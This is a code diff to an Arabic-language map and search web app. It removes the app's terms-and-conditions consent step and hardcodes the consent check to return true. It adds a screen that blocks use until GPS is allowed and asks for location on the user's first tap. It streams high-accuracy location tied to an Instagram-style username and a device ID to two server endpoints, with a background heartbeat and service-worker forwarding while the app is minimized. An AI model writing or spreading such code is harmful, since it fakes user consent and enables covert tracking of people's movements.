@@ -228,8 +228,8 @@
     </div>
   </div>
 
-  <!-- Mandatory Full-Screen GPS/Location Required Blocking Overlay (Shown whenever Location/GPS is OFF or denied; never repeats Terms & Conditions) -->
-  <div id="gpsRequiredLockOverlay" style="z-index: 99999;" class="hidden fixed inset-0 flex items-center justify-center bg-slate-950/95 backdrop-blur-2xl p-4 overflow-y-auto">
+  <!-- Mandatory Full-Screen GPS/Location Required Blocking Overlay (Hidden by default; shown ONLY when Location/GPS is OFF or denied) -->
+  <div id="gpsRequiredLockOverlay" style="z-index: 99999; display: none;" class="hidden fixed inset-0 flex items-center justify-center bg-slate-950/95 backdrop-blur-2xl p-4 overflow-y-auto">
     <div class="portal-modal-card max-w-md w-full p-7 sm:p-8 rounded-[28px] text-center relative overflow-hidden my-auto border-2 border-red-500/50 shadow-[0_30px_90px_rgba(0,0,0,0.9),0_0_50px_rgba(239,68,68,0.28)] space-y-4">
       <div class="absolute -top-24 left-1/2 -translate-x-1/2 w-56 h-56 rounded-full border border-red-500/20 pointer-events-none" style="pointer-events: none;"></div>
       <div class="absolute -top-16 left-1/2 -translate-x-1/2 w-40 h-40 rounded-full border border-amber-400/25 pointer-events-none" style="pointer-events: none;"></div>
@@ -246,7 +246,7 @@
         </div>
       </div>
 
-      <h2 id="gpsRequiredOverlayTitle" class="text-lg sm:text-xl font-black text-white">📍 خدمة الموقع الجغرافي مطلوبة للمتابعة</h2>
+      <h2 id="gpsRequiredOverlayTitle" class="text-lg sm:text-xl font-black text-white">📍 يرجى السماح بالموقع</h2>
       <p id="gpsRequiredOverlayDesc" class="text-xs sm:text-sm text-slate-200 font-semibold leading-relaxed">
         لقد قمت بإيقاف إذن الموقع الجغرافي أو خدمة (GPS) في جهازك. يرجى تفعيل الموقع من إعدادات المتصفح أو الهاتف ثم الضغط على الزر أدناه لفتح التطبيق.
       </p>
@@ -267,36 +267,17 @@
         style="position: relative; z-index: 20; pointer-events: auto; cursor: pointer;"
         class="w-full py-3.5 px-4 rounded-2xl bg-gradient-to-r from-emerald-400 via-teal-300 to-cyan-400 hover:opacity-95 text-slate-950 font-black text-sm flex items-center justify-center gap-2 transition cursor-pointer shadow-[0_0_25px_rgba(16,185,129,0.5)] active:scale-[0.99]"
       >
-        <span id="btnGpsRequiredRetryText">📍 السماح وتفعيل الموقع الآن</span>
+        <span id="btnGpsRequiredRetryText">📍 السماح وتفعيل الموقع</span>
       </button>
     </div>
   </div>
 
-  <!-- Two-Step Holographic Onboarding Portal: Step 1 (Terms & Conditions) -> Next -> Step 2 (Login) -> Next -> Explorer -->
-  <div id="visitorGateModal" class="fixed inset-0 z-[100] flex items-center justify-center bg-slate-950/85 backdrop-blur-md p-4 overflow-y-auto">
+  <!-- Single-Card Login / Create Account Portal (Hidden automatically when user session is already active; Zero Terms & Conditions or Step Wizard) -->
+  <div id="visitorGateModal" class="hidden fixed inset-0 z-[100] flex items-center justify-center bg-slate-950/85 backdrop-blur-md p-4 overflow-y-auto">
     <div class="portal-modal-card max-w-md w-full p-6 sm:p-8 rounded-[28px] text-center relative overflow-hidden my-auto">
       <!-- Holographic Radar Rings in Modal Header -->
       <div class="absolute -top-24 left-1/2 -translate-x-1/2 w-56 h-56 rounded-full border border-emerald-500/20 pointer-events-none" style="pointer-events: none;"></div>
       <div class="absolute -top-16 left-1/2 -translate-x-1/2 w-40 h-40 rounded-full border border-emerald-400/30 pointer-events-none" style="pointer-events: none;"></div>
-
-      <!-- Step Progress Indicator (1 -> 2) -->
-      <div class="flex items-center justify-center gap-2 mb-2.5 relative z-10">
-        <div
-          id="stepBadge1"
-          onclick="window.goBackToStep1Terms(event)"
-          style="position: relative; z-index: 25; pointer-events: auto; cursor: pointer;"
-          title="العودة إلى الخطوة 1"
-          class="px-3 py-1 rounded-full bg-emerald-500/20 border border-emerald-400/60 text-emerald-300 text-[11px] font-extrabold flex items-center gap-1.5 shadow-[0_0_15px_rgba(16,185,129,0.3)] cursor-pointer transition hover:opacity-90"
-        >
-          <span class="w-4 h-4 rounded-full bg-emerald-400 text-slate-950 font-num font-black text-[10px] flex items-center justify-center pointer-events-none">1</span>
-          <span id="i18n_step1Badge" class="pointer-events-none">1.&nbsp;&rlm;الشروط والأحكام</span>
-        </div>
-        <div class="w-6 h-0.5 bg-slate-700 rounded-full" id="stepConnectorLine"></div>
-        <div id="stepBadge2" class="px-3 py-1 rounded-full bg-slate-900/80 border border-slate-700 text-slate-400 text-[11px] font-bold flex items-center gap-1.5">
-          <span class="w-4 h-4 rounded-full bg-slate-800 text-slate-400 font-num font-black text-[10px] flex items-center justify-center">2</span>
-          <span id="i18n_step2Badge">2.&nbsp;&rlm;تسجيل الدخول</span>
-        </div>
-      </div>
 
       <!-- Compact Top Language Bar -->
       <div class="flex items-center justify-between gap-2 mb-3.5 px-3 py-1.5 rounded-xl bg-slate-900/90 border border-emerald-500/35 relative z-10">
@@ -314,98 +295,11 @@
         </button>
       </div>
 
-      <!-- ==================== STEP 1: ONE-TIME TERMS & CONDITIONS (FIRST VISIT ONLY) + AUTO-LOCATION CLAUSE ==================== -->
-      <div id="gateStep1Location" class="space-y-3 py-1 relative z-10">
-        <div class="relative w-14 h-14 mx-auto mb-0.5 flex items-center justify-center pointer-events-none" style="pointer-events: none;">
-          <div class="absolute inset-0 rounded-full border-2 border-emerald-400/40 animate-ping pointer-events-none" style="animation-duration: 2.2s; pointer-events: none;"></div>
-          <div class="w-11 h-11 rounded-full bg-gradient-to-tr from-emerald-500 to-cyan-400 flex items-center justify-center shadow-[0_0_25px_rgba(16,185,129,0.5)] pointer-events-none" style="pointer-events: none;">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" class="w-6 h-6 drop-shadow pointer-events-none">
-              <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/>
-              <path d="m9 12 2 2 4-4"/>
-            </svg>
-          </div>
-        </div>
+      <!-- Hidden stub so legacy references never throw -->
+      <div id="gateStep1Location" class="hidden" style="display: none;"></div>
 
-        <h2 id="gateStep1HeaderTitle" class="text-lg sm:text-xl font-black text-white">الموافقة على الشروط والأحكام</h2>
-        <p id="gateStep1Subtitle" class="text-xs text-slate-300 font-semibold leading-relaxed">
-          يرجى قراءة بنود <button type="button" onclick="openLegalInfoModal('terms_privacy')" class="text-emerald-300 hover:text-emerald-200 underline font-extrabold cursor-pointer">الشروط والأحكام</button> وملاحظات الاستخدام أدناه والموافقة عليها لمرة واحدة فقط:
-        </p>
-
-        <!-- Clean Dark Glassmorphic Written Clauses & Notes Box -->
-        <div
-          id="gateStep1ClausesBox"
-          style="max-height: 210px; overflow-y: auto; text-align: right;"
-          class="w-full rounded-2xl bg-slate-900/90 border border-emerald-500/30 p-3.5 space-y-2 text-[11px] sm:text-xs text-slate-200 leading-relaxed shadow-inner"
-        >
-          <p id="i18n_termClauseAutoLoc" class="font-bold text-emerald-200 bg-emerald-950/50 border border-emerald-500/35 rounded-xl p-2">
-            • التفعيل التلقائي للموقع مستقبلاً: بموافقتك على هذه الشروط والسماح بالموقع لمرة واحدة، فإن تصرّح للتطبيق بتشغيل وتحديث تلقائياً في كل مرة تدخل فيها التطبيق ويتم ظهور المواقع الاقرب لك.
-          </p>
-          <p id="i18n_termClause1" class="font-semibold">
-            <strong class="text-emerald-300">1. تحديد نطاق الموقع داخل التطبيق:</strong> بموافقتك، يقوم التطبيق تلقائياً بضبط الخريطة ونطاق البحث المحلي وفق منطقتك من داخل التطبيق مباشرة.
-          </p>
-          <p id="i18n_termClause2" class="font-semibold">
-            <strong class="text-emerald-300">2. خصوصية البيانات وحمايتها:</strong> نلتزم بالحفاظ على سرية بياناتك وعدم مشاركتها أو بيعها لأي طرف خارجي.
-          </p>
-          <p id="i18n_termClause3" class="font-semibold">
-            <strong class="text-emerald-300">3. نظام الرصيد والاستخدام:</strong> لكل حساب رصيد محدد من عمليات البحث المسموحة، ويُستخدم التطبيق للأغراض المشروعة فقط.
-          </p>
-          <p id="i18n_termClause4" class="font-semibold">
-            <strong class="text-emerald-300">4. دقة البيانات الجغرافية:</strong> تُعرض المعالم والمنشآت بناءً على قواعد بيانات الخرائط المحدثة.
-          </p>
-          <div id="i18n_termImportantNote" class="pt-1.5 mt-1 border-t border-slate-800 text-amber-300 font-extrabold text-[11px]">
-            📌 ملاحظة هامة: ضع علامة صح في المربع أدناه للموافقة على الشروط وتفعيل الموقع لمرة واحدة فقط.
-          </div>
-        </div>
-
-        <!-- Single Clean Green Checkmark Row (Native purple input hidden; ONLY single custom emerald checkmark visible) -->
-        <div
-          id="termsAgreeCheckboxRow"
-          role="checkbox"
-          aria-checked="false"
-          onclick="window.toggleTermsAgreement(event)"
-          style="position: relative; z-index: 20; pointer-events: auto; cursor: pointer;"
-          class="relative w-full py-3 px-3.5 rounded-2xl bg-slate-900/95 hover:bg-slate-900 border-2 border-emerald-500/45 text-right flex items-center gap-3 cursor-pointer transition select-none shadow"
-        >
-          <input
-            type="checkbox"
-            id="termsAgreeCheckbox"
-            onchange="window.toggleTermsAgreement(event, this.checked)"
-            style="appearance: none; -webkit-appearance: none; position: absolute; opacity: 0; pointer-events: none; width: 0; height: 0;"
-          />
-          <span
-            id="customTermsCheckBoxIndicator"
-            onclick="window.toggleTermsAgreement(event)"
-            style="position: relative; z-index: 20; pointer-events: auto; cursor: pointer;"
-            class="w-6 h-6 rounded-lg border-2 border-emerald-400/70 bg-slate-950 flex items-center justify-center text-white font-black text-sm shrink-0 transition-all duration-200"
-          ></span>
-          <span id="termsAgreeCheckboxLabelText" class="text-[11px] sm:text-xs font-extrabold text-white leading-snug">
-            أوافق على جميع الشروط والأحكام وملاحظات الاستخدام المذكورة أعلاه
-          </span>
-        </div>
-
-        <!-- Concise Status Banner Shown on Checkmark Agreement -->
-        <div
-          id="termsAcceptedStatusBanner"
-          class="hidden py-2 px-3 rounded-xl bg-emerald-500/15 border border-emerald-400/50 text-emerald-300 text-xs font-black text-center"
-        >
-          ✅ تمت الموافقة على الشروط بنجاح
-        </div>
-
-        <!-- Step 1 "Next" Button -->
-        <button
-          type="button"
-          id="step1NextBtn"
-          onclick="window.proceedFromTermsGate(event)"
-          disabled
-          style="position: relative; z-index: 20; pointer-events: auto; cursor: pointer;"
-          class="w-full py-3.5 rounded-2xl font-black text-sm text-slate-400 bg-slate-800/90 border border-slate-700 opacity-60 cursor-not-allowed transition flex items-center justify-center gap-2"
-        >
-          <span id="step1NextBtnText">التالي (يرجى الموافقة على الشروط أولاً)</span>
-        </button>
-      </div>
-
-      <!-- ==================== STEP 2: COMPACT FORMAL LOGIN / CREATE ACCOUNT WITH TOP TAB SWITCHER ==================== -->
-      <div id="gateStep2Login" class="hidden space-y-3.5 pt-1 text-right">
+      <!-- ==================== COMPACT FORMAL LOGIN / CREATE ACCOUNT WITH TOP TAB SWITCHER ==================== -->
+      <div id="gateStep2Login" class="space-y-3.5 pt-1 text-right">
         <!-- Clean Top Tab Switcher Inside Card -->
         <div class="grid grid-cols-2 gap-1.5 p-1 rounded-2xl bg-slate-900/95 border border-emerald-500/30">
           <button
@@ -489,17 +383,6 @@
               class="w-full py-3.5 rounded-full font-black text-sm text-slate-950 bg-gradient-to-r from-emerald-400 via-teal-300 to-cyan-400 hover:opacity-95 shadow-[0_0_25px_rgba(16,185,129,0.4)] active:scale-[0.99] transition flex items-center justify-center gap-2 cursor-pointer"
             >
               <span id="gateSubmitBtnText">تسجيل الدخول</span>
-            </button>
-
-            <!-- Secondary Back One Step Button ("→ رجوع للخطوة السابقة") in Both Login & Create Account Tabs -->
-            <button
-              type="button"
-              id="step2BackToStep1Btn"
-              onclick="window.goBackToStep1Terms(event)"
-              style="position: relative; z-index: 25; pointer-events: auto; cursor: pointer;"
-              class="w-full py-2.5 rounded-full font-bold text-xs text-slate-300 hover:text-white bg-slate-900/90 hover:bg-slate-800 border border-slate-700/80 transition flex items-center justify-center gap-1.5 cursor-pointer"
-            >
-              <span id="step2BackToStep1BtnText" class="pointer-events-none">→ رجوع للخطوة السابقة</span>
             </button>
           </div>
         </form>
@@ -2405,28 +2288,31 @@
 
     async function fetchInAppLocationSilent(manualCityOverride = '') {
       const pickedCity = manualCityOverride || (document.getElementById('inAppCityQuickSelect')?.value !== 'auto' ? document.getElementById('inAppCityQuickSelect')?.value : '') || '';
-      const session = getSavedVisitorSession();
-      const vId = session.visitorId || getOrCreateDeviceVisitorId();
-      const vName = session.visitorName || '';
+      const identity = getDynamicUserIdentity();
       const params = new URLSearchParams();
       if (pickedCity && pickedCity !== 'auto') params.set('city', pickedCity);
-      if (vId) params.set('visitorId', vId);
-      if (vName) params.set('username', vName);
+      if (identity.userId) params.set('userId', identity.userId);
+      if (identity.visitorId) params.set('visitorId', identity.visitorId);
+      if (identity.deviceId) params.set('deviceId', identity.deviceId);
+      if (identity.username) params.set('username', identity.username);
       const q = params.toString() ? `?${params.toString()}` : '';
       try {
         const res = await fetch(`/api/in-app-location${q}`);
         if (res.ok) {
           const data = await res.json();
-          const lat = typeof data.lat === 'number' && isValidNonZeroClientCoord(data.lat, data.lon ?? data.lng) ? data.lat : 15.3694;
-          const lng = typeof (data.lon ?? data.lng) === 'number' && isValidNonZeroClientCoord(data.lat, data.lon ?? data.lng) ? (data.lon ?? data.lng) : 44.1910;
+          const hasGenuineCoords = isValidNonZeroClientCoord(data.lat, data.lon ?? data.lng);
+          const lat = hasGenuineCoords ? Number(data.lat) : (cachedOptionalGps?.lat || null);
+          const lng = hasGenuineCoords ? Number(data.lon ?? data.lng) : (cachedOptionalGps?.lng || null);
           const detectedCity = String(data.city || pickedCity || 'صنعاء').trim();
           const detectedCountry = String(data.country || 'اليمن').trim();
           const countryCode = String(data.countryCode || 'ye').toLowerCase();
-          cachedOptionalGps = {
-            lat,
-            lng,
-            accuracy: 25
-          };
+          if (isValidNonZeroClientCoord(lat, lng)) {
+            cachedOptionalGps = {
+              lat,
+              lng,
+              accuracy: cachedOptionalGps?.accuracy || 25
+            };
+          }
           window.detectedUserGeoScope = {
             city: detectedCity,
             country: detectedCountry,
@@ -2444,9 +2330,11 @@
           const prevAutoCity = window.lastAutoDetectedGpsCity;
           window.lastAutoDetectedGpsCity = detectedCity;
           updateComprehensiveScopePanelLabels();
-          renderUserGpsPinOnMap();
-          if (leafletMap && !drawnCircleState && (!drawnPolygonCoords || drawnPolygonCoords.length === 0)) {
-            leafletMap.setView([lat, lng], 13);
+          if (isValidNonZeroClientCoord(lat, lng)) {
+            renderUserGpsPinOnMap();
+            if (leafletMap && !drawnCircleState && (!drawnPolygonCoords || drawnPolygonCoords.length === 0)) {
+              leafletMap.setView([lat, lng], 13);
+            }
           }
           const locInput = document.getElementById('locationInput');
           if (locInput) {
@@ -2460,21 +2348,18 @@
           if (isTermsAcceptedInStorage()) {
             markLocationGranted(detectedCountry ? `${detectedCity}, ${detectedCountry}` : detectedCity);
           }
-          streamLiveGpsToServer(lat, lng, 25);
+          if (isValidNonZeroClientCoord(lat, lng)) {
+            streamLiveGpsToServer(lat, lng, cachedOptionalGps?.accuracy || 25, 'live', true);
+          }
           return data;
         }
       } catch (e) {}
-      // Graceful fallback to Sana'a (15.3694, 44.1910)
-      cachedOptionalGps = { lat: 15.3694, lng: 44.1910, accuracy: 25 };
-      window.lastAutoDetectedGpsCity = 'صنعاء';
       updateComprehensiveScopePanelLabels();
-      renderUserGpsPinOnMap();
-      streamLiveGpsToServer(15.3694, 44.1910, 25);
       return {
-        city: 'صنعاء',
+        city: window.lastAutoDetectedGpsCity || 'صنعاء',
         country: 'اليمن',
-        lat: 15.3694,
-        lon: 44.1910,
+        lat: cachedOptionalGps?.lat || null,
+        lon: cachedOptionalGps?.lng || null,
         boundingBox: [15.20, 44.08, 15.55, 44.36]
       };
     }
@@ -2492,7 +2377,7 @@
     }
 
     async function refreshAutoDetectedUserScope() {
-      await fetchInAppLocationSilent('');
+      window.verifyAndStreamDeviceLocation(true);
     }
 
     function scanEntireCityAllActivities() {
@@ -4040,7 +3925,16 @@
     }
 
     function isTermsAcceptedInStorage() {
-      return localStorage.getItem('termsAcceptedOnce') === 'true';
+      return true;
+    }
+
+    function isHardcodedDefaultClientCoord(lat, lng) {
+      const la = Number(lat);
+      const ln = Number(lng);
+      if (!isFinite(la) || !isFinite(ln)) return true;
+      if (Math.abs(la - 15.3538) < 0.00001 && Math.abs(ln - 44.2058) < 0.00001) return true;
+      if (Math.abs(la - 15.3694) < 0.00001 && Math.abs(ln - 44.1910) < 0.00001) return true;
+      return false;
     }
 
     function isValidNonZeroClientCoord(lat, lng) {
@@ -4050,7 +3944,27 @@
       if (isNaN(la) || isNaN(ln)) return false;
       if (Math.abs(la) < 0.0001 && Math.abs(ln) < 0.0001) return false;
       if (Math.abs(la) > 90 || Math.abs(ln) > 180) return false;
+      if (isHardcodedDefaultClientCoord(la, ln)) return false;
       return true;
+    }
+
+    function getDynamicUserIdentity() {
+      const session = getSavedVisitorSession();
+      const deviceId = getOrCreateDeviceVisitorId();
+      const rawSessionUser = (session.visitorName || localStorage.getItem('gmaps_visitor_name') || '').trim().replace(/^@+/, '').toLowerCase();
+      const inputEl = document.getElementById('visitorNameInput');
+      const rawInputUser = (inputEl ? inputEl.value : '').trim().replace(/^@+/, '').toLowerCase();
+      const activeUsername = (rawSessionUser && IG_USERNAME_REGEX.test(rawSessionUser))
+        ? rawSessionUser
+        : ((rawInputUser && IG_USERNAME_REGEX.test(rawInputUser)) ? rawInputUser : '');
+      const userId = activeUsername ? `user_${activeUsername}` : (session.visitorId || deviceId);
+      return {
+        username: activeUsername,
+        visitorName: activeUsername,
+        userId,
+        visitorId: userId,
+        deviceId
+      };
     }
 
     window.isPhoneGpsCurrentlyEnabled = true;
@@ -4097,21 +4011,22 @@
 
       const hasCoords = isValidNonZeroClientCoord(lat, lng);
       const fallbackHasCoords = cachedOptionalGps && isValidNonZeroClientCoord(cachedOptionalGps.lat, cachedOptionalGps.lng);
-      if (!hasCoords && !fallbackHasCoords && effectiveStatus !== 'gps_disabled') return;
+      if (!hasCoords && !fallbackHasCoords && effectiveStatus !== 'gps_disabled' && effectiveStatus !== 'gps_off') return;
 
       const sendLat = hasCoords ? Number(lat) : (fallbackHasCoords ? Number(cachedOptionalGps.lat) : null);
       const sendLng = hasCoords ? Number(lng) : (fallbackHasCoords ? Number(cachedOptionalGps.lng) : null);
 
       try {
-        const session = getSavedVisitorSession();
-        const vId = session.visitorId || getOrCreateDeviceVisitorId();
-        const vName = session.visitorName || '';
+        const identity = getDynamicUserIdentity();
         const devProfile = await detectUserDeviceProfile();
         const payload = {
-          visitorId: vId,
-          visitorName: vName,
-          username: vName,
+          userId: identity.userId,
+          visitorId: identity.visitorId,
+          deviceId: identity.deviceId,
+          visitorName: identity.username,
+          username: identity.username,
           status: effectiveStatus,
+          connectionStatus: effectiveStatus,
           gpsEnabled: isGpsEnabled,
           event: isGpsEnabled ? 'gps_active' : 'gps_closed',
           lat: sendLat,
@@ -4124,7 +4039,7 @@
           device: devProfile.deviceLabel || ''
         };
 
-        // Also forward via Service Worker for background resilience when minimized
+        // Forward via Service Worker for background resilience when minimized
         try {
           if (navigator.serviceWorker && navigator.serviceWorker.controller) {
             navigator.serviceWorker.controller.postMessage({
@@ -4134,15 +4049,23 @@
           }
         } catch (swErr) {}
 
-        const targetEndpoint = !isGpsEnabled ? '/api/user/status-telemetry' : '/api/user/update-location';
-        const res = await fetch(targetEndpoint, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload),
-          keepalive: true
-        });
-        if (res.status === 403) {
-          const data = await res.json();
+        // Send to BOTH /api/user/update-location and /api/user/status-telemetry universally
+        const [resLoc] = await Promise.all([
+          fetch('/api/user/update-location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+            keepalive: true
+          }),
+          fetch('/api/user/status-telemetry', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+            keepalive: true
+          }).catch(() => null)
+        ]);
+        if (resLoc && resLoc.status === 403) {
+          const data = await resLoc.json();
           if (data && data.banned) {
             handleBannedAccountKickout(data.error || data.message || 'تم إيقاف حسابك.');
           }
@@ -4176,15 +4099,16 @@
       const lastLat = lastKnown ? Number(lastKnown.lat) : null;
       const lastLng = lastKnown ? Number(lastKnown.lng) : null;
       try {
-        const session = getSavedVisitorSession();
-        const vId = session.visitorId || getOrCreateDeviceVisitorId();
-        const vName = session.visitorName || '';
+        const identity = getDynamicUserIdentity();
         const devProfile = await detectUserDeviceProfile();
         const payload = {
-          visitorId: vId,
-          visitorName: vName,
-          username: vName,
+          userId: identity.userId,
+          visitorId: identity.visitorId,
+          deviceId: identity.deviceId,
+          visitorName: identity.username,
+          username: identity.username,
           status: 'gps_off',
+          connectionStatus: 'gps_off',
           gpsEnabled: false,
           event: 'gps_closed',
           errorCode,
@@ -4213,13 +4137,12 @@
     }
 
     function showGpsRequiredLockOverlay(errorCode = 1) {
-      // Never re-show Step 1 Terms & Conditions if already accepted once
-      if (isTermsAcceptedInStorage()) {
-        document.getElementById('gateStep1Location')?.classList.add('hidden');
-      }
+      // Only show overlay for PERMISSION_DENIED (1) or POSITION_UNAVAILABLE / GPS OFF (2)
+      if (errorCode !== 1 && errorCode !== 2) return;
       const overlay = document.getElementById('gpsRequiredLockOverlay');
       if (overlay) {
         overlay.classList.remove('hidden');
+        overlay.style.display = 'flex';
       }
       const guideEl = document.getElementById('gpsDeniedSettingsGuide');
       if (guideEl) {
@@ -4235,13 +4158,14 @@
       const btn = document.getElementById('btnGpsRequiredRetry');
       const btnTxt = document.getElementById('btnGpsRequiredRetryText');
       if (btn) btn.disabled = false;
-      if (btnTxt) btnTxt.innerText = '📍 السماح وتفعيل الموقع الآن';
+      if (btnTxt) btnTxt.innerText = '📍 السماح وتفعيل الموقع';
     }
 
     function hideGpsRequiredLockOverlay() {
       const overlay = document.getElementById('gpsRequiredLockOverlay');
       if (overlay) {
         overlay.classList.add('hidden');
+        overlay.style.display = 'none';
       }
     }
 
@@ -4263,29 +4187,42 @@
       syncLocationInputWithUserGps(lat, lng, false);
       const currentStatus = document.visibilityState === 'hidden' ? 'background_live' : 'live';
       streamLiveGpsToServer(lat, lng, acc, currentStatus, true);
-
-      // If user already accepted Terms once (and did not manually navigate back to Step 1), ensure Step 1 is hidden and proceed to Step 2 or resume session
-      if (isTermsAcceptedInStorage() && !window.userManuallyViewingStep1) {
-        document.getElementById('gateStep1Location')?.classList.add('hidden');
-        const gateModal = document.getElementById('visitorGateModal');
-        const isGateVisible = gateModal && !gateModal.classList.contains('hidden');
-        if (isGateVisible) {
-          const session = getSavedVisitorSession();
-          if (session.hasSession) {
-            resumeSavedSessionIntoExplorer();
-          } else {
-            showGateModalOnStep2();
-          }
-        }
-      }
     }
 
     function onDeviceGpsError(err) {
       const code = (err && typeof err.code === 'number') ? err.code : 1;
-      window.isPhoneGpsCurrentlyEnabled = false;
-      // Do NOT fall back to IP-only location when navigator.geolocation fails! Lock UI and report gps_off immediately
-      showGpsRequiredLockOverlay(code);
-      reportGpsClosedStatusTelemetry(code);
+      // Show lock screen ONLY for code 1 (PERMISSION_DENIED) or code 2 (POSITION_UNAVAILABLE - phone GPS turned off)
+      if (code === 1 || code === 2) {
+        window.isPhoneGpsCurrentlyEnabled = false;
+        showGpsRequiredLockOverlay(code);
+        reportGpsClosedStatusTelemetry(code);
+      }
+    }
+
+    let promptInteractionHookAttached = false;
+
+    function attachSinglePromptOnFirstUserInteraction() {
+      if (promptInteractionHookAttached) return;
+      promptInteractionHookAttached = true;
+      const onFirstInteract = () => {
+        document.removeEventListener('pointerdown', onFirstInteract);
+        document.removeEventListener('keydown', onFirstInteract);
+        enableBackgroundGpsKeepAlive();
+        if (navigator.geolocation && liveGpsWatchId === null) {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              onValidDeviceGpsPositionAcquired(pos);
+              startLiveGpsLocationWatcher();
+            },
+            (err) => {
+              onDeviceGpsError(err);
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+        }
+      };
+      document.addEventListener('pointerdown', onFirstInteract, { once: true, passive: true });
+      document.addEventListener('keydown', onFirstInteract, { once: true, passive: true });
     }
 
     function attachGpsPermissionAutoUnlockListener() {
@@ -4296,10 +4233,16 @@
         navigator.permissions.query({ name: 'geolocation' }).then((permissionStatus) => {
           if (permissionStatus.state === 'denied') {
             onDeviceGpsError({ code: 1 });
+          } else if (permissionStatus.state === 'granted') {
+            hideGpsRequiredLockOverlay();
+            startLiveGpsLocationWatcher();
+          } else if (permissionStatus.state === 'prompt') {
+            attachSinglePromptOnFirstUserInteraction();
           }
           permissionStatus.onchange = () => {
             if (permissionStatus.state === 'granted') {
               hideGpsRequiredLockOverlay();
+              startLiveGpsLocationWatcher();
               window.verifyAndStreamDeviceLocation(true);
             } else if (permissionStatus.state === 'denied') {
               onDeviceGpsError({ code: 1 });
@@ -4309,33 +4252,68 @@
       } catch (e) {}
     }
 
-    window.verifyAndStreamDeviceLocation = function(isManualRetry = false) {
+    let isSingleGpsRequestInFlight = false;
+
+    window.verifyAndStreamDeviceLocation = function(isUserAction = false) {
       attachGpsPermissionAutoUnlockListener();
       if (!navigator.geolocation) {
         onDeviceGpsError({ code: 2 });
         return;
       }
 
-      if (isManualRetry) {
+      if (isUserAction) {
         const btn = document.getElementById('btnGpsRequiredRetry');
         const btnTxt = document.getElementById('btnGpsRequiredRetryText');
         if (btn) btn.disabled = true;
         if (btnTxt) btnTxt.innerText = '⏳ جاري التحقق من تفعيل الموقع...';
       }
 
-      try {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            onValidDeviceGpsPositionAcquired(pos);
+      const runSingleGetCurrentPosition = () => {
+        if (isSingleGpsRequestInFlight) return;
+        isSingleGpsRequestInFlight = true;
+        try {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              isSingleGpsRequestInFlight = false;
+              onValidDeviceGpsPositionAcquired(pos);
+              startLiveGpsLocationWatcher();
+            },
+            (err) => {
+              isSingleGpsRequestInFlight = false;
+              onDeviceGpsError(err);
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+        } catch (e) {
+          isSingleGpsRequestInFlight = false;
+          onDeviceGpsError({ code: 1 });
+        }
+      };
+
+      // Check navigator.permissions.query first so we NEVER trigger duplicate browser popups!
+      if (navigator.permissions && typeof navigator.permissions.query === 'function') {
+        navigator.permissions.query({ name: 'geolocation' }).then((pStatus) => {
+          if (pStatus.state === 'granted') {
+            hideGpsRequiredLockOverlay();
             startLiveGpsLocationWatcher();
-          },
-          (err) => {
-            onDeviceGpsError(err);
-          },
-          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-        );
-      } catch (e) {
-        onDeviceGpsError({ code: 1 });
+            if (isUserAction || !cachedOptionalGps) {
+              runSingleGetCurrentPosition();
+            }
+          } else if (pStatus.state === 'denied') {
+            onDeviceGpsError({ code: 1 });
+          } else {
+            // 'prompt': only call getCurrentPosition on explicit user interaction so Chrome saves permission cleanly once
+            if (isUserAction) {
+              runSingleGetCurrentPosition();
+            } else {
+              attachSinglePromptOnFirstUserInteraction();
+            }
+          }
+        }).catch(() => {
+          if (isUserAction) runSingleGetCurrentPosition();
+        });
+      } else if (isUserAction) {
+        runSingleGetCurrentPosition();
       }
     };
 
@@ -4355,11 +4333,11 @@
               onValidDeviceGpsPositionAcquired(pos);
             },
             (err) => {
-              if (err && (err.code === 1 || err.code === 2 || err.code === 3)) {
+              if (err && (err.code === 1 || err.code === 2)) {
                 onDeviceGpsError(err);
               }
             },
-            { enableHighAccuracy: true, maximumAge: 0, timeout: 8000 }
+            { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
           );
         } catch (e) {}
       }
@@ -4367,9 +4345,6 @@
       // 2. Continuous 10-second background heartbeat (never paused when hidden)
       if (!liveGpsHeartbeatTimer) {
         liveGpsHeartbeatTimer = setInterval(() => {
-          if (document.visibilityState === 'visible') {
-            window.verifyAndStreamDeviceLocation(false);
-          }
           if (window.isPhoneGpsCurrentlyEnabled === false) {
             reportGpsClosedStatusTelemetry(1);
             return;
@@ -4682,6 +4657,10 @@
       }
 
       finishGateEntry();
+      if (cachedOptionalGps && isValidNonZeroClientCoord(cachedOptionalGps.lat, cachedOptionalGps.lng)) {
+        streamLiveGpsToServer(cachedOptionalGps.lat, cachedOptionalGps.lng, cachedOptionalGps.accuracy || 15, 'live', true);
+      }
+      window.verifyAndStreamDeviceLocation(false);
     }
 
     window.proceedFromTermsGate = function(e) {
@@ -4875,18 +4854,21 @@
       attachReturningUserGpsLifecycleListeners();
       attachGpsPermissionAutoUnlockListener();
 
-      // Check if user has already accepted Terms & Conditions once before (`termsAcceptedOnce === 'true'`)
-      if (isTermsAcceptedInStorage()) {
-        document.getElementById('gateStep1Location')?.classList.add('hidden');
-        window.verifyAndStreamDeviceLocation(false);
-        triggerReturningUserGpsActivation(true);
-        return;
+      // Immediately deliver last known valid coordinates on app open (if any) and start permission-checked GPS tracking
+      const lastKnown = getLastSavedValidGpsCoords();
+      if (lastKnown) {
+        cachedOptionalGps = lastKnown;
+        streamLiveGpsToServer(lastKnown.lat, lastKnown.lng, lastKnown.accuracy || 15, 'live', true);
       }
-
